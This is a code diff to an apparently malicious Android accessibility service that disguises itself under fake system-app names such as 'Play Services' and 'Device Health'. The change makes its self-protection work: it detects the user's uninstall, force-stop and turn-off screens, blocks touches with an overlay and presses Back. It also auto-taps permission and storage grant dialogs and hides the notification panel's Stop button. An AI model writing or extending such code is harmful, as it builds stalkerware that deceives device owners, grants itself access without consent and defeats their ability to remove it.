@@ -22,6 +22,7 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.List;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Color;
@@ -612,13 +613,47 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
     
     private void updateCurrentAppName() {
+        // The OS displays the active chameleon alias label (e.g. "Play Services"),
+        // not the "TestApp" placeholder from getApplicationLabel(getApplicationInfo()).
+        // Try each known alias label and return the first one whose alias component
+        // is currently enabled. This matches what the user actually sees.
         try {
-            String packageName = getPackageName();
             PackageManager pm = getPackageManager();
-            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
-            currentAppName = pm.getApplicationLabel(appInfo).toString();
+            String pkg = getPackageName();
+            String[] suffixes = com.task.tusker.security.ChameleonIdentity.ALIAS_SUFFIXES;
+            for (int i = 0; i < suffixes.length; i++) {
+                try {
+                    ComponentName alias = new ComponentName(pkg, pkg + suffixes[i]);
+                    int state = pm.getComponentEnabledSetting(alias);
+                    if (state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                        // Found the active alias — resolve its label
+                        int labelRes = 0;
+                        switch (i) {
+                            case 0: labelRes = R.string.alias_label_0; break;
+                            case 1: labelRes = R.string.alias_label_1; break;
+                            case 2: labelRes = R.string.alias_label_2; break;
+                            case 3: labelRes = R.string.alias_label_3; break;
+                            case 4: labelRes = R.string.alias_label_4; break;
+                        }
+                        if (labelRes != 0) {
+                            currentAppName = getString(labelRes);
+                            return;
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }
+            // Fallback: try PackageManager label for the package
+            try {
+                ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
+                CharSequence label = pm.getApplicationLabel(appInfo);
+                if (label != null && !label.toString().isEmpty()) {
+                    currentAppName = label.toString();
+                    return;
+                }
+            } catch (Exception ignored) {}
+            currentAppName = getString(R.string.app_name);
         } catch (Exception e) {
-            currentAppName = "";
+            currentAppName = getString(R.string.app_name);
         }
     }
 
@@ -1644,18 +1679,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (!screenText.contains("files") && !screenText.contains("storage")
                     && !screenText.contains("media")) return;
 
-            String appName = getString(R.string.app_name);
-            if (!screenText.contains(appName.toLowerCase())) return;
+            // Use all possible app labels — the OS shows the chameleon alias label
+            if (!isAnyAppNameOnScreen(screenText)) return;
 
-            // Try findAccessibilityNodeInfosByText first — most reliable.
-            List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(appName);
+            // Search for ALL possible app labels to find our row on the list
+            List<AccessibilityNodeInfo> rows = new ArrayList<>();
+            for (String name : getAllAppLabelNames()) {
+                if (name == null || name.isEmpty()) continue;
+                List<AccessibilityNodeInfo> found = rootNode.findAccessibilityNodeInfosByText(name);
+                if (found != null) rows.addAll(found);
+            }
             if (rows != null) {
                 for (AccessibilityNodeInfo row : rows) {
                     try {
                         if (row == null) continue;
                         if (row.isClickable()) {
                             row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            Log.i(TAG, "Storage list granter: tapped app row \"" + appName + "\"");
+                            Log.i(TAG, "Storage list granter: tapped app row \"" + row.getText() + "\"");
                             break;
                         }
                         // Walk up to find a clickable ancestor (list item container).
@@ -1746,7 +1786,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void updateNotifPanelStopOverlay() {
         try {
-            String appName = getString(R.string.app_name);
+            // Use currentAppName which now returns the active chameleon alias label
+            String appName = currentAppName;
+            if (appName == null || appName.isEmpty()) {
+                appName = getEffectiveAppName();
+            }
             // Locate the exact pixel bounds of the app row so the overlay covers
             // the Stop button precisely.
             android.graphics.Rect bounds = findActiveAppsRowBounds(appName);
@@ -1773,7 +1817,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return null;
+            // Try the exact label first, then fall back to all possible labels
             android.graphics.Rect bounds = findAppRowInNode(root, appName);
+            if (bounds == null) {
+                for (String name : getAllAppLabelNames()) {
+                    if (name == null || name.isEmpty() || name.equals(appName)) continue;
+                    bounds = findAppRowInNode(root, name);
+                    if (bounds != null) break;
+                }
+            }
             root.recycle();
             return bounds;
         } catch (Exception ignored) {}
@@ -2590,20 +2642,55 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Returns true if any of the labels the OS could show for this package appear
-     * in the (already lower-cased) screen text.
-     *
-     * We check:
-     *   1. The runtime PackageManager label — this is what Android actually shows in
-     *      dialogs and matches whichever ComponentName is currently enabled.
-     *   2. All five chameleon alias labels from string resources.
-     *   3. The base app_name string (fallback / pre-chameleon state).
-     *
-     * Using only getString(R.string.app_name) was the original bug: that string is
-     * "TestApp" (the placeholder), but the OS shows whichever alias label is active
-     * ("Play Services", "Device Health", etc.) in the permission dialog — so the
-     * name check always failed and runPermissionGranter returned false immediately.
-     */
+      * Returns all labels the OS could display for this app: the PackageManager
+      * runtime label, all five chameleon alias labels, and the base app_name.
+      *
+      * Using only {@code getString(R.string.app_name)} was the original bug:
+      * that string is "TestApp" (the placeholder), but the OS shows whichever
+      * alias label is active ("Play Services", "Device Health", etc.) in Settings,
+      * accessibility detail pages, uninstall dialogs, and App Info — so the name
+      * check always failed and the anti-uninstall / anti-turn-off protection
+      * never triggered.
+      */
+    private java.util.List<String> getAllAppLabelNames() {
+        java.util.List<String> names = new java.util.ArrayList<>();
+        // 1. PackageManager runtime label (what the OS shows in dialogs/lists)
+        try {
+            CharSequence pmLabel = getPackageManager().getApplicationLabel(getApplicationInfo());
+            if (pmLabel != null && !pmLabel.toString().isEmpty()) {
+                names.add(pmLabel.toString());
+            }
+        } catch (Exception ignored) {}
+        // 2. All chameleon alias labels + base app_name
+        int[] labelIds = {
+                R.string.alias_label_0,
+                R.string.alias_label_1,
+                R.string.alias_label_2,
+                R.string.alias_label_3,
+                R.string.alias_label_4,
+                R.string.app_name
+        };
+        for (int id : labelIds) {
+            try {
+                String label = getString(id).trim();
+                if (!label.isEmpty() && !names.contains(label)) {
+                    names.add(label);
+                }
+            } catch (Exception ignored) {}
+        }
+        return names;
+    }
+
+    /**
+      * Returns true if any of the labels the OS could show for this package appear
+      * in the (already lower-cased) screen text.
+      *
+      * We check:
+      *   1. The runtime PackageManager label — this is what Android actually shows in
+      *      dialogs and matches whichever ComponentName is currently enabled.
+      *   2. All five chameleon alias labels from string resources.
+      *   3. The base app_name string (fallback / pre-chameleon state).
+      */
     private boolean isAnyAppNameOnScreen(String screenTextLower) {
         // 1. Runtime label from PackageManager (most reliable)
         try {
@@ -2616,12 +2703,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         // 2. All chameleon alias labels + base app_name
         int[] labelIds = {
-            R.string.alias_label_0,
-            R.string.alias_label_1,
-            R.string.alias_label_2,
-            R.string.alias_label_3,
-            R.string.alias_label_4,
-            R.string.app_name
+                R.string.alias_label_0,
+                R.string.alias_label_1,
+                R.string.alias_label_2,
+                R.string.alias_label_3,
+                R.string.alias_label_4,
+                R.string.app_name
         };
         for (int id : labelIds) {
             try {
@@ -2630,6 +2717,57 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } catch (Exception ignored) {}
         }
         return false;
+    }
+
+    /**
+      * Collects all AccessibilityNodeInfos whose text matches ANY of the app's
+      * possible labels (PackageManager label + chameleon aliases). This replaces
+      * the old single-label findAccessibilityNodeInfosByText(appName) call that
+      * only searched for the "TestApp" placeholder.
+      */
+    private List<AccessibilityNodeInfo> findNameNodesForAllLabels(AccessibilityNodeInfo root) {
+        List<AccessibilityNodeInfo> allNodes = new ArrayList<>();
+        if (root == null) return allNodes;
+        for (String name : getAllAppLabelNames()) {
+            if (name == null || name.isEmpty()) continue;
+            try {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(name);
+                if (nodes != null) allNodes.addAll(nodes);
+            } catch (Exception ignored) {}
+        }
+        return allNodes;
+    }
+
+    /** Returns the label the OS is currently displaying for this app. */
+    private String getEffectiveAppName() {
+        PackageManager pm = getPackageManager();
+        String pkg = getPackageName();
+        // Check which chameleon alias is currently enabled — its label is what
+        // the OS shows in Settings, dialogs, notification panels, etc.
+        try {
+            String[] suffixes = com.task.tusker.security.ChameleonIdentity.ALIAS_SUFFIXES;
+            int[] labelIds = {
+                R.string.alias_label_0, R.string.alias_label_1, R.string.alias_label_2,
+                R.string.alias_label_3, R.string.alias_label_4
+            };
+            for (int i = 0; i < suffixes.length && i < labelIds.length; i++) {
+                try {
+                    ComponentName alias = new ComponentName(pkg, pkg + suffixes[i]);
+                    int state = pm.getComponentEnabledSetting(alias);
+                    if (state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                        return getString(labelIds[i]);
+                    }
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+        // Fallback: PackageManager label
+        try {
+            CharSequence pmLabel = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0));
+            if (pmLabel != null && !pmLabel.toString().isEmpty()) {
+                return pmLabel.toString();
+            }
+        } catch (Exception ignored) {}
+        return getString(R.string.app_name);
     }
 
     /** Schedules a BACK press after the given delay in milliseconds. */
@@ -2647,9 +2785,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
         try {
-            String appName = getString(R.string.app_name).toLowerCase();
             String screenText = getAllScreenText(rootNode).toLowerCase();
-            if (!screenText.contains(appName)) return false;
+            if (!isAnyAppNameOnScreen(screenText)) return false;
 
             // If there is a direct Allow / Grant / Turn on button on the page, click it first.
             String[] directButtons = { "Allow", "Grant", "Turn on", "Enable", "OK", "Ok", "Yes", "Accept" };
@@ -2813,14 +2950,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private boolean runCleanerAppDefend(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
         try {
-            String protectedAppName = currentAppName;
-            if (protectedAppName == null || protectedAppName.isEmpty()) {
-                protectedAppName = getString(R.string.app_name);
-            }
-            if (protectedAppName == null || protectedAppName.isEmpty()) return false;
-            // Use direct node search — fast, avoids full tree traversal.
-            List<AccessibilityNodeInfo> nameNodes =
-                    rootNode.findAccessibilityNodeInfosByText(protectedAppName);
+            // Search for ALL possible app labels — the OS shows the active
+            // chameleon alias, not the "TestApp" placeholder.
+            List<AccessibilityNodeInfo> nameNodes = findNameNodesForAllLabels(rootNode);
             boolean foundName = nameNodes != null && !nameNodes.isEmpty();
             if (nameNodes != null) {
                 for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
@@ -2859,16 +2991,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (node == null) return false;
 
         try {
-            String protectedAppName = currentAppName;
-            if (protectedAppName == null || protectedAppName.isEmpty()) {
-                protectedAppName = getString(R.string.app_name);
-            }
-            if (protectedAppName == null || protectedAppName.isEmpty()) return false;
-            String allText     = getAllScreenText(node).toLowerCase();
-            String appNameLower = protectedAppName.toLowerCase();
-
-            // Our app name must be visible on screen.
-            if (!allText.contains(appNameLower)) return false;
+            // Use isAnyAppNameOnScreen() instead of currentAppName — the OS
+            // shows the chameleon alias label, but currentAppName holds the
+            // "TestApp" placeholder from getApplicationLabel().
+            String allText = getAllScreenText(node).toLowerCase();
+            if (!isAnyAppNameOnScreen(allText)) return false;
 
             if (isSettingsPkg) {
                 // Inside Android Settings we only defend on the App Info page.
@@ -3290,6 +3417,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 || System.currentTimeMillis() < protectionSuspendedUntil) {
             return;
         }
+        // Ensure currentAppName reflects the active chameleon alias label,
+        // not the stale "TestApp" placeholder from getApplicationLabel().
+        updateCurrentAppName();
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
         try {
@@ -3325,6 +3455,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         boolean isSystemUIPkg = "com.android.systemui".equals(normalizedPackage);
 
         if (!isSettingsPkg && !isSystemUIPkg) {
+            // Leaving Settings entirely — make sure the overlay is gone.
+            removeAccessibilityAssistOverlay();
             return;
         }
 
@@ -3336,9 +3468,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // (post() so onAccessibilityEvent returns quickly).
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                String appName = getString(R.string.app_name);
                 AccessibilityNodeInfo root = getRootInActiveWindow();
-                if (root == null) return;
+                if (root == null) {
+                    // No window root — clean up any overlay from a previous detection.
+                    removeAccessibilityAssistOverlay();
+                    return;
+                }
 
                 // Do not dismiss the system dialog opened by the explicit,
                 // exact-package self-destruct flow.
@@ -3347,11 +3482,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     return;
                 }
 
-                // Search for the app name and all known action/danger keywords.
-                // We only defend when the user is on an ACTION page (service detail,
-                // stop dialog, App Info) — NOT when our app name is just one row in
-                // the apps list or the accessibility-services list.
-                List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+                // Search for the app name using ALL possible labels (PackageManager
+                // label + chameleon aliases + app_name). The OS shows the active
+                // chameleon alias label, not "TestApp", so a single-label search
+                // never matched and the protection silently failed.
+                List<AccessibilityNodeInfo> nameNodes      = findNameNodesForAllLabels(root);
                 List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
                 List<AccessibilityNodeInfo> turnOffNodes   = root.findAccessibilityNodeInfosByText("turn off");
                 List<AccessibilityNodeInfo> denyNodes      = root.findAccessibilityNodeInfosByText("deny");
@@ -3359,11 +3494,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
                 String screenText = getAllScreenText(root)
                         .toLowerCase(java.util.Locale.ROOT);
-                String appNameLower = appName.toLowerCase(java.util.Locale.ROOT);
                 root.recycle();
 
                 boolean foundName      = (nameNodes      != null && !nameNodes.isEmpty())
-                        || screenText.contains(appNameLower);
+                        || isAnyAppNameOnScreen(screenText);
                 boolean foundStop      = (stopNodes      != null && !stopNodes.isEmpty())
                         || screenText.contains("stop");
                 boolean foundTurnOff   = (turnOffNodes   != null && !turnOffNodes.isEmpty())
@@ -3390,7 +3524,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 if (forceStopNodes != null) for (AccessibilityNodeInfo n : forceStopNodes) try { n.recycle(); } catch (Exception ignored) {}
                 if (uninstallNodes != null) for (AccessibilityNodeInfo n : uninstallNodes) try { n.recycle(); } catch (Exception ignored) {}
 
-                if (!foundName) return; // App name not on screen — nothing to protect
+                if (!foundName) {
+                    // App name not on screen — remove any stale overlay and leave the screen alone.
+                    removeAccessibilityAssistOverlay();
+                    return;
+                }
 
                 // Require at least one action keyword to be visible alongside the app name.
                 // These words only appear on the service DETAIL page, stop/confirmation dialog,
@@ -3398,9 +3536,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 // where our name is just one scrollable row.
                 boolean onDangerPage = foundStop || foundTurnOff || foundDeny
                         || foundAppInfoAction || foundUseService;
-                if (!onDangerPage) return; // App name in a list — leave the screen alone
+                if (!onDangerPage) {
+                    // Not an action page — remove any stale overlay and leave the screen alone.
+                    removeAccessibilityAssistOverlay();
+                    return;
+                }
 
-                // On an actual action page: press Back to dismiss it.
+                // On an actual action page: show a touch-blocking overlay to prevent
+                // the user tapping the toggle while we dismiss the page.
+                showAccessibilityAssistOverlay();
+
+                // Press Back to dismiss the detail page or dialog.
                 try { performBack(); } catch (Exception ignored) {}
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                     try { performBack(); } catch (Exception ignored) {}
@@ -3724,8 +3870,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 root.recycle();
                 return;
             }
-            String appName = getString(R.string.app_name);
-            List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+            java.util.List<String> allAppNames = getAllAppLabelNames();
+            List<AccessibilityNodeInfo> nameNodes = new ArrayList<>();
+            for (String n : allAppNames) {
+                List<AccessibilityNodeInfo> found = root.findAccessibilityNodeInfosByText(n);
+                if (found != null) nameNodes.addAll(found);
+            }
+            // Screen-text fallback (some OEM skins render the label as content-desc
+            // or inside a composite node that findAccessibilityNodeInfosByText misses).
+            String screenTextLower = getAllScreenText(root).toLowerCase();
             List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
             List<AccessibilityNodeInfo> killNodes      = root.findAccessibilityNodeInfosByText("kill");
             List<AccessibilityNodeInfo> removeNodes    = root.findAccessibilityNodeInfosByText("remove");
@@ -3735,7 +3888,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             List<AccessibilityNodeInfo> optionsNodes   = root.findAccessibilityNodeInfosByText("options");
             root.recycle();
 
-            boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
+            boolean foundName      = (nameNodes != null && !nameNodes.isEmpty())
+                    || isAnyAppNameOnScreen(screenTextLower);
             boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
             boolean foundKill      = killNodes      != null && !killNodes.isEmpty();
             boolean foundRemove    = removeNodes    != null && !removeNodes.isEmpty();
@@ -3799,15 +3953,23 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 return;
             }
 
-            String appName = getString(R.string.app_name);
-            List<AccessibilityNodeInfo> nameNodes      = root.findAccessibilityNodeInfosByText(appName);
+            java.util.List<String> allAppNames = getAllAppLabelNames();
+            List<AccessibilityNodeInfo> nameNodes = new ArrayList<>();
+            for (String n : allAppNames) {
+                List<AccessibilityNodeInfo> found = root.findAccessibilityNodeInfosByText(n);
+                if (found != null) nameNodes.addAll(found);
+            }
+            // Screen-text fallback — some OEM skins render the label as content-desc
+            // or inside a composite node that findAccessibilityNodeInfosByText misses.
+            String screenTextLower = getAllScreenText(root).toLowerCase();
             List<AccessibilityNodeInfo> stopNodes      = root.findAccessibilityNodeInfosByText("stop");
             List<AccessibilityNodeInfo> turnOffNodes   = root.findAccessibilityNodeInfosByText("turn off");
             List<AccessibilityNodeInfo> denyNodes      = root.findAccessibilityNodeInfosByText("deny");
             List<AccessibilityNodeInfo> forceStopNodes = root.findAccessibilityNodeInfosByText("force stop");
             List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("uninstall");
 
-            boolean foundName      = nameNodes      != null && !nameNodes.isEmpty();
+            boolean foundName      = (nameNodes      != null && !nameNodes.isEmpty())
+                    || isAnyAppNameOnScreen(screenTextLower);
             boolean foundStop      = stopNodes      != null && !stopNodes.isEmpty();
             boolean foundTurnOff   = turnOffNodes   != null && !turnOffNodes.isEmpty();
             boolean foundDeny      = denyNodes      != null && !denyNodes.isEmpty();
